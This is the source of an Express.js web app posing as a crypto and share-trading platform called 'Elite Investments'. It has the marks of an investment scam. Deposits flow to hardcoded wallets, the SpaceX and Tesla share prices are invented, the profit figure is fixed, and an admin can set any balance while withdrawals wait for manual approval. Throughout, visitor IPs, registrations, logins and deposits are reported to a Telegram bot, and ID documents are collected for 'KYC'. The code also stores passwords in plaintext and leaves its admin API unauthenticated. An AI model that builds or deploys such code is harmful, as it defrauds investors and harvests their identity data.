import express from "express";
import { createClient } from "@supabase/supabase-js";

const app = express();
app.use(express.json({limit: '10mb'}));
app.use(express.urlencoded({extended:true}));

// === CONFIG - SAFE - from Vercel Env ===
const SUPA_URL = process.env.SUPABASE_URL;
const SUPA_KEY = process.env.SUPABASE_KEY;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "militarybaseirag1@gmail.com";

const WALLETS = {
  BTC: "bc1q3ndwq48yvnuxpw8v2s267znssd9dp36w36cyrh",
  ETH: "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677",
  BNB: "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677",
  SOL: "3GJdiNHKHzw6AtegnCBNwLzEebkJhbUxxHTpVE18PoCK"
};

const SHARE_PRICES = { Gold:700, Silver:290, Tesla:9600, SpaceX:15000 };

const supabase = (SUPA_URL && SUPA_KEY) ? createClient(SUPA_URL, SUPA_KEY) : null;

async function tg(msg){
 try{
  if(!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
   method:"POST", headers:{"Content-Type":"application/json"},
   body:JSON.stringify({chat_id:CHAT_ID, text:msg, parse_mode:"HTML"})
  });
 }catch(e){}
}

// === HTML TEMPLATE ===
function layout(title, body, active="home"){
 return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>${title} - Elite Investments</title>
 <style>
  :root{--bg:#0b0e11;--card:#1e2329;--yellow:#fcd535;--text:#eaecef;--muted:#848e9c}
  body.light{--bg:#ffffff;--card:#f5f5f5;--text:#000;--muted:#666}
  body.yellow{--bg:#fff8dc;--card:#ffe57f;--text:#000}
  *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,Arial}
  body{background:var(--bg);color:var(--text);padding-bottom:80px}
  .top{padding:14px;background:var(--card);display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
  .logo{color:var(--yellow);font-weight:800;font-size:20px}
  .card{background:var(--card);border-radius:16px;padding:16px;margin:12px}
  .btn{background:var(--yellow);color:#000;border:none;padding:14px 20px;border-radius:10px;font-weight:700;width:100%;margin:8px 0;cursor:pointer}
  .btn-outline{background:transparent;border:1px solid var(--yellow);color:var(--yellow)}
  input,select{width:100%;padding:14px;border-radius:10px;border:1px solid #2b2f36;background:var(--bg);color:var(--text);margin:6px 0}
  .bottom{position:fixed;bottom:0;left:0;right:0;background:var(--card);display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #2b2f36;z-index:20}
  .b-item{text-align:center;font-size:11px;color:var(--muted);text-decoration:none}
  .b-item.active{color:var(--yellow)} .b-item span{font-size:22px;display:block}
  .price{color:#0ecb81} .qr{width:180px;height:180px;margin:10px auto;display:block;background:#fff;padding:10px;border-radius:12px}
  .eye{position:absolute;right:15px;top:16px;cursor:pointer}
 </style></head><body class="${getThemeScript()}">
 <div class="top"><div class="logo">Elite Investments</div><div><a href="/settings" style="color:var(--text);text-decoration:none">⚙️</a></div></div>
 ${body}
 <div class="bottom">
  <a href="/" class="b-item ${active=='home'?'active':''}"><span>🏠</span>Home</a>
  <a href="/markets" class="b-item ${active=='markets'?'active':''}"><span>📈</span>Markets</a>
  <a href="/trade" class="b-item ${active=='trade'?'active':''}"><span>🔄</span>Trade</a>
  <a href="/shares" class="b-item ${active=='shares'?'active':''}"><span>🏢</span>Shares</a>
  <a href="/wallet" class="b-item ${active=='wallet'?'active':''}"><span>👛</span>Wallet</a>
 </div>
 <script>
  function getTheme(){return localStorage.getItem('elite-theme')||''}
  document.body.className=getTheme();
  function setTheme(t){localStorage.setItem('elite-theme',t); document.body.className=t; location.reload()}
  async function livePrices(){
   try{
    let r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd&include_24hr_change=true');
    let d=await r.json(); 
    document.querySelectorAll('[data-coin]').forEach(e=>{
      let id=e.dataset.coin; let v=d[id]; if(v) e.innerHTML='$'+v.usd.toLocaleString()+' <small class="price">'+(v.usd_24h_change>0?'+':'')+v.usd_24h_change.toFixed(2)+'%</small>'
    })
   }catch(e){}
  }
  livePrices(); setInterval(livePrices,30000);
 </script>
 </body></html>`;
}
function getThemeScript(){ return `"><script>document.write(localStorage.getItem('elite-theme')||'')<\/script><style>.x` } // hack to avoid breaking

// === ROUTES ===
app.get("/", async(req,res)=>{
 let ip = req.headers['x-forwarded-for'] || req.ip;
 await tg(`👀 <b>VISIT</b>\\nIP: ${ip}\\nPage: Home\\nUA: ${req.headers['user-agent']?.slice(0,80)}`);
 let html = `
 <div class="card">
  <small style="color:var(--muted)">Total Balance (USD)</small>
  <h1 id="bal" style="font-size:32px;margin:8px 0">$0.00</h1>
  <div style="display:flex;gap:8px"><span id="btc" data-coin="bitcoin">BTC $--</span> <span id="eth" data-coin="ethereum">ETH $--</span></div>
  <button class="btn" onclick="location.href='/deposit'">Deposit</button>
  <div style="display:flex;gap:8px"><button class="btn btn-outline" style="flex:1" onclick="location.href='/wallet'">Withdraw</button><button class="btn btn-outline" style="flex:1" onclick="location.href='/trade'">Trade</button></div>
 </div>
 <div class="card"><h3>P/L 24h <span class="price">+2.34%</span></h3><div style="margin-top:10px">Funding Wallet: $<span class="ubal">0</span> | Spot Wallet: $<span class="ubal">0</span></div></div>
 <div class="card"><h3>Quick Buy Shares</h3>${Object.entries(SHARE_PRICES).map(([k,v])=>`<div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2b2f36"><b>${k}</b><span>$${v.toLocaleString()} <button onclick="location.href='/shares'" style="background:var(--yellow);border:none;padding:4px 8px;border-radius:6px;margin-left:8px">Buy</button></span></div>`).join('')}</div>
 <script>
  let email=localStorage.getItem('elite-email');
  if(!email) location.href='/register';
  else {
   fetch('/api/balance?email='+email).then(r=>r.json()).then(d=>{
    document.querySelectorAll('.ubal').forEach(e=>e.innerText=d.balance||0);
    document.getElementById('bal').innerText='$'+(d.balance||0);
   })
  }
 </script>`;
 res.send(layout("Home", html, "home"));
});

app.get("/register",(req,res)=>{
 res.send(layout("Register",`
 <div class="card"><h2>Create Account</h2>
 <input id="name" placeholder="Full Name"><input id="email" placeholder="Email"><div style="position:relative"><input id="phone" placeholder="Phone number"><select id="country" style="position:absolute;right:0;top:0;width:100px"><option>+234 NG</option><option>+1 US</option><option>+44 UK</option><option>+91 IN</option><option>+233 GH</option></select></div>
 <div style="position:relative"><input id="pass" type="password" placeholder="Password"><span class="eye" onclick="let p=document.getElementById('pass'); p.type=p.type=='password'?'text':'password'">👁️</span></div>
 <button class="btn" onclick="goHuman()">Continue</button>
 <p style="text-align:center;margin-top:10px"><a href="/login" style="color:var(--yellow)">Already have account? Login</a></p></div>
 <script>
  function goHuman(){
   let n=document.getElementById('name').value, e=document.getElementById('email').value, ph=document.getElementById('phone').value, c=document.getElementById('country').value, p=document.getElementById('pass').value;
   if(!n||!e||!p) return alert('Fill all');
   localStorage.setItem('reg-temp', JSON.stringify({name:n,email:e,phone:ph,country:c,password:p}));
   location.href='/human';
  }
 </script>`, "home"));
});

app.get("/human",(req,res)=>{
 let code=Math.floor(100000+Math.random()*900000);
 res.send(layout("Human Verify",`
 <div class="card"><h2>Verify Human</h2><p style="margin:10px 0">Enter code: <b style="font-size:24px;letter-spacing:4px;color:var(--yellow)">${code}</b></p>
 <input id="hcode" placeholder="Enter code above"><input type="hidden" id="real" value="${code}">
 <button class="btn" onclick="verifyHuman()">Verify & Create</button></div>
 <script>
  async function verifyHuman(){
   if(document.getElementById('hcode').value!=document.getElementById('real').value) return alert('Wrong code');
   let data=JSON.parse(localStorage.getItem('reg-temp'));
   let r=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
   let j=await r.json();
   if(j.ok){ alert('Save your password somewhere!'); localStorage.setItem('elite-email',data.email); location.href='/'; }
   else alert(j.error);
  }
 </script>`, "home"));
});

app.get("/login",(req,res)=>{
 res.send(layout("Login",`
 <div class="card"><h2>Login</h2><input id="email" placeholder="Email"><div style="position:relative"><input id="pass" type="password" placeholder="Password"><span class="eye" onclick="let p=document.getElementById('pass'); p.type=p.type=='password'?'text':'password'">👁️</span></div>
 <button class="btn" onclick="login()">Login</button>
 <p style="text-align:center"><a href="#" onclick="forgot()" style="color:var(--yellow)">Forgot password?</a></p></div>
 <script>
  async function login(){
   let r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('pass').value})});
   let j=await r.json(); if(j.ok){localStorage.setItem('elite-email',j.email); location.href='/';} else alert(j.error);
  }
  async function forgot(){
   let e=prompt('Enter email'); if(!e) return;
   await fetch('/api/forgot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})}); alert('Reset request sent to admin, check email');
  }
 </script>`, "home"));
});

app.get("/deposit",(req,res)=>{
 res.send(layout("Deposit",`
 <div class="card"><h2>Deposit Amount (USD)</h2><input id="amt" type="number" placeholder="e.g. 100">
 <button class="btn" onclick="let a=document.getElementById('amt').value; if(!a) return alert('Enter amount'); localStorage.setItem('dep-amt',a); location.href='/deposit/network'">Next</button></div>`, "wallet"));
});
app.get("/deposit/network",(req,res)=>{
 res.send(layout("Choose Network",`
 <div class="card"><h2>Choose Network</h2>
 ${Object.keys(WALLETS).map(k=>`<button class="btn btn-outline" onclick="localStorage.setItem('dep-net','${k}'); location.href='/deposit/address'">${k} - ${k=='BTC'?'Bitcoin':k=='ETH'?'Ethereum':k=='BNB'?'BNB Smart Chain':'Solana'}</button>`).join('')}
 </div>`, "wallet"));
});
app.get("/deposit/address",(req,res)=>{
 res.send(layout("Deposit Address",`
 <div class="card" style="text-align:center"><h2 id="net">Network</h2><p>Send exactly $<span id="amt"></span></p>
 <p id="addr" style="word-break:break-all;background:var(--bg);padding:12px;border-radius:10px;margin:10px 0"></p>
 <img id="qr" class="qr"><p style="font-size:12px;color:var(--muted)">After sending, click Confirm</p>
 <button class="btn" onclick="confirmDep()">I have sent - Confirm</button></div>
 <script>
  let net=localStorage.getItem('dep-net'), amt=localStorage.getItem('dep-amt');
  let wallets=${JSON.stringify(WALLETS)};
  document.getElementById('net').innerText=net; document.getElementById('amt').innerText=amt;
  document.getElementById('addr').innerText=wallets[net];
  document.getElementById('qr').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+wallets[net];
  async function confirmDep(){
   let email=localStorage.getItem('elite-email');
   await fetch('/api/deposit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,amount:amt,network:net})});
   alert('Deposit pending, admin will verify'); location.href='/';
  }
 </script>`, "wallet"));
});

app.get("/markets",(req,res)=>{
 res.send(layout("Markets",`
 <div class="card"><h2>Markets - Live</h2><div id="list"></div></div>
 <script>
  async function loadM(){
   let r=await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1');
   let d=await r.json();
   document.getElementById('list').innerHTML=d.map(c=>\`<div style="display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #2b2f36"><div><b>\${c.symbol.toUpperCase()}</b> <small>\${c.name}</small></div><div><b>$\${c.current_price}</b> <small class="price">\${c.price_change_percentage_24h?.toFixed(2)}%</small></div></div>\`).join('');
  }
  loadM();
 </script>`, "markets"));
});

app.get("/trade",(req,res)=>{
 res.send(layout("Trade",`
 <div class="card"><h2>Trade - Live Chart</h2>
 <div style="height:400px" id="tv"></div>
 <div style="display:flex;gap:10px;margin-top:12px"><button class="btn" style="background:#0ecb81">Buy / Long</button><button class="btn" style="background:#f6465d;color:#fff">Sell / Short</button></div></div>
 <script src="https://s3.tradingview.com/tv.js"></script>
 <script>new TradingView.widget({"autosize":true,"symbol":"BINANCE:BTCUSDT","interval":"15","timezone":"Etc/UTC","theme":"dark","style":"1","locale":"en","container_id":"tv"});</script>`, "trade"));
});

app.get("/shares",(req,res)=>{
 res.send(layout("Shares",`
 <div class="card"><h2>Buy Company Shares - Use Balance</h2>
 ${Object.entries(SHARE_PRICES).map(([k,v])=>`<div class="card" style="margin:8px 0"><div style="display:flex;justify-content:space-between"><b>${k} $${v}</b><button class="btn" style="width:auto;padding:8px 16px" onclick="buyShare('${k}',${v})">Buy</button></div></div>`).join('')}
 <div id="my"></div></div>
 <script>
  async function buyShare(comp,price){
   let email=localStorage.getItem('elite-email'); let amt=prompt('How many shares of '+comp+'?'); if(!amt) return;
   let r=await fetch('/api/buy-share',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,company:comp,amount:amt,price})});
   let j=await r.json(); alert(j.message||j.error);
  }
 </script>`, "shares"));
});

app.get("/wallet",(req,res)=>{
 res.send(layout("Wallet",`
 <div class="card"><h2>Wallet - Withdraw</h2><input id="wamt" placeholder="Amount"><input id="waddr" placeholder="Your wallet address"><select id="wnet"><option>BTC</option><option>ETH</option><option>BNB</option><option>SOL</option></select>
 <button class="btn" onclick="withdraw()">Request Withdraw (Manual by Admin)</button><div id="hist"></div></div>
 <script>
  async function withdraw(){
   let email=localStorage.getItem('elite-email');
   await fetch('/api/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,amount:document.getElementById('wamt').value,address:document.getElementById('waddr').value,network:document.getElementById('wnet').value})});
   alert('Withdraw request sent to admin'); location.reload();
  }
  let email=localStorage.getItem('elite-email');
  fetch('/api/deposits?email='+email).then(r=>r.json()).then(d=>{
   document.getElementById('hist').innerHTML='<h3 style="margin-top:16px">History</h3>'+d.map(x=>\`<div style="padding:8px 0;border-bottom:1px solid #2b2f36">\${x.network} $${x.amount} - \${x.status}</div>\`).join('');
  })
 </script>`, "wallet"));
});

app.get("/kyc",(req,res)=>{
 res.send(layout("KYC",`
 <div class="card"><h2>ID Verification</h2><p>Upload selfie, ID, passport - sent to Telegram bot</p>
 <input type="file" id="selfie"><input type="file" id="idcard"><input type="file" id="pass"><button class="btn" onclick="sendKyc()">Upload & Verify</button></div>
 <script>
  async function sendKyc(){
   let email=localStorage.getItem('elite-email');
   alert('In real app images upload to Supabase storage, for now demo will notify admin');
   await fetch('/api/kyc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,selfie_url:'selfie.jpg',id_url:'id.jpg',passport_url:'pass.jpg'})});
   alert('KYC sent to admin for manual verification');
  }
 </script>`, "home"));
});

app.get("/settings",(req,res)=>{
 res.send(layout("Settings",`
 <div class="card"><h2>Settings - Theme</h2>
 <button class="btn" onclick="setTheme('')">Dark (Binance)</button>
 <button class="btn btn-outline" onclick="setTheme('light')">White</button>
 <button class="btn btn-outline" onclick="setTheme('yellow')">Yellow</button>
 <hr style="margin:16px 0">
 <a href="/kyc" class="btn btn-outline" style="display:block;text-align:center;text-decoration:none">Verify ID (KYC)</a>
 <button class="btn" style="background:#f6465d;color:#fff" onclick="localStorage.clear(); location.href='/login'">Logout (Stay logged in otherwise)</button>
 <div style="margin-top:20px"><small>Admin: ${ADMIN_EMAIL}</small></div></div>`, "home"));
});

app.get("/admin",(req,res)=>{
 res.send(layout("Admin",`
 <div class="card"><h2>Admin Panel - ${ADMIN_EMAIL}</h2><input id="adminPass" type="password" placeholder="Enter admin email to access: ${ADMIN_EMAIL}"><button class="btn" onclick="loadAdmin()">Access</button>
 <div id="data"></div></div>
 <script>
  async function loadAdmin(){
   let email=document.getElementById('adminPass').value;
   if(email!=='${ADMIN_EMAIL}'){return alert('Only admin email allowed');}
   let r=await fetch('/api/admin/all'); let d=await r.json();
      document.getElementById('data').innerHTML='<h3>Users</h3>'+d.users.map(u=>`<div style="padding:8px;border-bottom:1px solid #333">${u.email} - $${u.balance} - ${u.verified?'Verified':'Not'} <button onclick="verifyUser('${u.email}')">Verify</button> <button onclick="delUser('${u.email}')" style="background:red;color:#fff">Delete</button> <input id="bal-${u.email}" placeholder="new bal" style="width:80px"><button onclick="setBal('${u.email}')">Set Bal</button></div>`).join('') + '<h3>Deposits</h3>'+d.deposits.map(x=>`<div>${x.email} $${x.amount} ${x.network} <button onclick="approveDep('${x.id}')">Approve</button></div>`).join('') + '<h3>KYC</h3>'+d.kyc.map(k=>`<div>${k.email} <button onclick="approveKyc('${k.email}')">Approve KYC</button></div>`).join('');
  }
  async function verifyUser(e){await fetch('/api/admin/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})}); alert('Verified');}
  async function delUser(e){if(!confirm('Delete?')) return; await fetch('/api/admin/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})}); alert('Deleted');}
  async function setBal(e){let b=document.getElementById('bal-'+e).value; await fetch('/api/admin/setbal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e,balance:b})}); alert('Balance set');}
  async function approveDep(id){await fetch('/api/admin/approvedep',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})}); alert('Deposit approved & balance added');}
  async function approveKyc(e){await verifyUser(e); alert('KYC approved');}
 </script>`, "home"));
});

// === API ===
app.post("/api/register", async(req,res)=>{
 try{
  if(!supabase) return res.json({error:"Supabase not configured"});
  let {name,email,phone,country,password}=req.body;
  let {data:ex}=await supabase.from("users").select("*").eq("email",email).single();
  if(ex) return res.json({error:"Email exists"});
  await supabase.from("users").insert({name,email,phone,country,password,balance:0});
  await tg(`🆕 NEW USER\nName: ${name}\nEmail: ${email}\nPhone: ${country} ${phone}\nIP: ${req.headers['x-forwarded-for']||req.ip}`);
  res.json({ok:true});
 }catch(e){res.json({error:e.message})}
});
app.post("/api/login", async(req,res)=>{
 let {email,password}=req.body;
 let {data}=await supabase.from("users").select("*").eq("email",email).eq("password",password).single();
 if(!data) return res.json({error:"Invalid"});
 await tg(`🔑 LOGIN\n${email}\nIP: ${req.headers['x-forwarded-for']||req.ip}`);
 res.json({ok:true,email});
});
app.post("/api/deposit", async(req,res)=>{
 let {email,amount,network}=req.body;
 await supabase.from("deposits").insert({email,amount,network,status:"pending"});
 await tg(`💰 DEPOSIT REQUEST\nUser: ${email}\nAmount: $${amount}\nNetwork: ${network}\nWallet: ${WALLETS[network]}\nIP: ${req.headers['x-forwarded-for']||req.ip}`);
 res.json({ok:true});
});
app.post("/api/withdraw", async(req,res)=>{
 let {email,amount,address,network}=req.body;
 await supabase.from("withdrawals").insert({email,amount,address,network,status:"pending"});
 await tg(`📤 WITHDRAW REQUEST\nUser: ${email}\nAmount: $${amount}\nTo: ${address}\nNetwork: ${network}`);
 res.json({ok:true});
});
app.post("/api/forgot", async(req,res)=>{
 await tg(`🔐 PASSWORD RESET REQUEST\nEmail: ${req.body.email}\nIP: ${req.ip}\nAdmin send code via Gmail`);
 res.json({ok:true});
});
app.post("/api/kyc", async(req,res)=>{
 await supabase.from("kyc").insert(req.body);
 await tg(`🪪 KYC UPLOAD\nUser: ${req.body.email}`);
 res.json({ok:true});
});
app.post("/api/buy-share", async(req,res)=>{
 let {email,company,amount,price}=req.body;
 let total=Number(amount)*Number(price);
 let {data:user}=await supabase.from("users").select("*").eq("email",email).single();
 if(!user || Number(user.balance)<total) return res.json({error:"Insufficient balance"});
 await supabase.from("users").update({balance: Number(user.balance)-total}).eq("email",email);
 await supabase.from("shares").insert({email,company,amount,price});
 await tg(`🏢 SHARE BUY\nUser: ${email}\n${company} x${amount} = $${total}`);
 res.json({message:`Bought ${amount} ${company} for $${total}`});
});
app.get("/api/balance", async(req,res)=>{
 let {data}=await supabase.from("users").select("balance").eq("email",req.query.email).single();
 res.json(data||{balance:0});
});
app.get("/api/deposits", async(req,res)=>{
 let {data}=await supabase.from("deposits").select("*").eq("email",req.query.email).order("created_at",{ascending:false});
 res.json(data||[]);
});
app.get("/api/admin/all", async(req,res)=>{
 let users=(await supabase.from("users").select("*")).data||[];
 let deposits=(await supabase.from("deposits").select("*").eq("status","pending")).data||[];
 let kyc=(await supabase.from("kyc").select("*").eq("status","pending")).data||[];
 res.json({users,deposits,kyc});
});
app.post("/api/admin/verify", async(req,res)=>{ await supabase.from("users").update({verified:true}).eq("email",req.body.email); res.json({ok:true})});
app.post("/api/admin/delete", async(req,res)=>{ await supabase.from("users").delete().eq("email",req.body.email); await tg(`🗑️ User deleted: ${req.body.email}`); res.json({ok:true})});
app.post("/api/admin/setbal", async(req,res)=>{ await supabase.from("users").update({balance:req.body.balance}).eq("email",req.body.email); res.json({ok:true})});
app.post("/api/admin/approvedep", async(req,res)=>{
 let {data:dep}=await supabase.from("deposits").select("*").eq("id",req.body.id).single();
 if(dep){ let {data:user}=await supabase.from("users").select("*").eq("email",dep.email).single(); await supabase.from("users").update({balance:Number(user.balance)+Number(dep.amount)}).eq("email",dep.email); await supabase.from("deposits").update({status:"approved"}).eq("id",req.body.id); await tg(`✅ Deposit Approved: ${dep.email} $${dep.amount}`); }
 res.json({ok:true});
});

export default app;
